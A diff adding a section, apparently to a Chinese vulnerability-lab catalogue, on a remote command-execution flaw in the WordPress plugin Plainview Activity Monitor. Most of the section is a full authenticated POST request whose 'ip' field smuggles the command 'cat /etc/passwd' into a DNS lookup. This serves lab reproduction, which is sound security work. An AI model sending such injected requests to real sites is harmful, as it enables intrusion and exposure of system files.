@@ -147,3 +147,46 @@ curl -d "<?xml version="1.0" encoding="utf-8"?><methodCall><methodName>wp.getMed
 
 
 
+## Wordpress 插件Plainview Activity Monitor 命令执行漏洞
+
+测试镜像
+
+- src/wordpress/4.9.8/
+
+影响版本
+
+- Plainview Activity Monitor < 20180826
+
+参考链接
+
+- [RCE with Plainview Activity Monitor WordPress plugin](https://github.com/aas-n/CVE/tree/master/plainview-activity-monitor)
+
+Poc
+
+登录后台并获取admin 的cookie，替换以下POST包中的cookie并发送，命令执行结果位于返回包的 out put from dig 处：
+
+```shell
+POST /wp-admin/admin.php?page=plainview_activity_monitor&tab=activity_tools HTTP/1.1
+Host: localhost
+User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.13; rv:61.0) Gecko/20100101 Firefox/61.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: fr,fr-FR;q=0.8,en-US;q=0.5,en;q=0.3
+Accept-Encoding: gzip, deflate
+Referer: http://localhost:8000/wp-admin/admin.php?page=plainview_activity_monitor&tab=activity_tools
+Content-Type: multipart/form-data; boundary=---------------------------13707449992054116824594351796
+Content-Length: 311
+Cookie: wordpress_70490311fe7c84acda8886406a6d884b=aas%7C1535400075%7CNJ8xAHSGtDKoNgc8tTpSZA6Dn6INW6PkzdG1IVzHX9Z%7C422290d1e6d712e3db5efb9ab4a9aa3df0631e20d5e0dce34ec84ec6f70766c8; PHPSESSID=18d2c15b8f5755104632ec1cc65c56e1; wordpress_test_cookie=WP+Cookie+check; wordpress_logged_in_70490311fe7c84acda8886406a6d884b=aas%7C1535400075%7CNJ8xAHSGtDKoNgc8tTpSZA6Dn6INW6PkzdG1IVzHX9Z%7C0d8cef0facff651e3b0b7790b6c3f84dad36051b8378487acbe5bf03ebef52af; wp-settings-1=deleted; wp-settings-time-1=1535227275
+Connection: close
+Upgrade-Insecure-Requests: 1
+
+-----------------------------13707449992054116824594351796
+Content-Disposition: form-data; name="ip"
+
+google.fr|cat /etc/passwd
+-----------------------------13707449992054116824594351796
+Content-Disposition: form-data; name="lookup"
+
+Lookup
+-----------------------------13707449992054116824594351796--
+```
+
